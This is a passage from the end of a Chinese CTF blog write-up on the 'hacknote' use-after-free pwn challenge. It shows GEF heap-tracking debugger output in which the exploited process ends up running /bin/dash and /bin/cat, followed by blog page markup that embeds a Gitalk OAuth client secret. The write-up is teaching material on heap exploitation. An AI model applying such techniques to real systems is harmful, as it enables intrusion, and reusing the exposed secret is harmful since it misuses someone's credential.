+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap-analysis-helper </span><br><span class="line">[*] This feature is under development, expect bugs and unstability...</span><br><span class="line">[+] Tracking malloc()</span><br><span class="line">[+] Tracking free()</span><br><span class="line">[+] Tracking realloc()</span><br><span class="line">[+] Disabling hardware watchpoints (this may increase the latency)</span><br><span class="line">[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</span><br><span class="line">[*] Note: The heap analysis slows down noticeably the execution. </span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(32)&#x3D;0x804b018</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(32)&#x3D;0x804b050</span><br><span class="line">[+] Heap-Analysis - free(0x804b018)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b018</span><br><span class="line">[+] Heap-Analysis - free(0x804b008)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b008</span><br><span class="line">[+] Heap-Analysis - free(0x804b050)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b050</span><br><span class="line">[+] Heap-Analysis - free(0x804b040)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - Cleaning up</span><br><span class="line">[+] Heap-Analysis - Re-enabling hardware watchpoints</span><br><span class="line">[New process 36248]</span><br><span class="line">process 36248 is executing new program: &#x2F;bin&#x2F;dash</span><br><span class="line">[New process 36249]</span><br><span class="line">process 36249 is executing new program: &#x2F;bin&#x2F;cat</span><br><span class="line">[Inferior 3 (process 36249) exited normally]</span><br></pre></td></tr></table></figure>
+
+<p>这里第一个输出了两次，应该是 gef 工具的问题。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-07-10T07:10:50.563Z" itemprop="dateUpdated">2019-07-10 15:10:50</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/&title=《hacknote -- Use After Free》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/&title=《hacknote -- Use After Free》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《hacknote -- Use After Free》 — 喵喵喵喵&url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/07/11/Smashes/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Smashes</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/07/05/CodeGate-2014-%E2%80%93-rev-pwn450-%E2%80%93-weird-snus/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">CodeGate 2014 – rev+pwn450 – weird_snus</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/&title=《hacknote -- Use After Free》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/&title=《hacknote -- Use After Free》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《hacknote -- Use After Free》 — 喵喵喵喵&url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACL0lEQVR42u3aS3LCQAxFUe9/0840VYmb+yQMZfXtUQqDzWGg6Hcc+Jy/ztXVq/f//Sx5/bjjyJAh47GMc3nIe/iD1z9E+lwZMmTsxlg/Mv2id39WhgwZMlIGeTy5A3+uDBkyZJDbrQtXXvqu7yxDhgwZaRGbMnho/mgtLkOGjAcy0jbZJ/++Zb4hQ4aMRzHO8KQpIA+OZ+PIkCFjNoMHuHRhgi9hrF8Plj9kyJAxlEFaXf0FL04lDbh/XpEhQ8ZoRm3ESBK7/tXiWFSGDBnjGLVhYTry7KR9aPwpQ4aMDRi8Ec9DJ080g2p7XYXLkCFjKIMvT/AErhaI06YemrXKkCFjBIMUinzcyEvTTqPtsoiVIUPGUEZ/SNkZA3TafJchWIYMGUMZacDtZ6O12cWL+8uQIWMoI122OPDhzbUv7IzIkCHj4Yy0Gceb+P2UES1byJAhYyijtpiVBlC+zJFGURkyZMxm1BKyFFYrgGOeDBkyNmakN+0MJjvDCRkyZOzAqI0P0+KzloaiMYYMGTI2ZpA11nToWFuWDZYtZMiQMZpRa37V1izSEekbdkZkyJDxQMYZnnScUPuB4pGnDBkyRjNq88EgXcNXyT8A0siTIUPGVAYPsjws8pWLzkBChgwZuzGCFjwOhXz8WVvUkCFDhgxeQNZKyjSkvkguZciQIQPfjqeYtZ/pzQFXhgwZj2LU2v3r4FgrYnkUlSFDxj4Mnsbx4EjAHJCORWXIkDGI8QPf2rwq4OawVwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
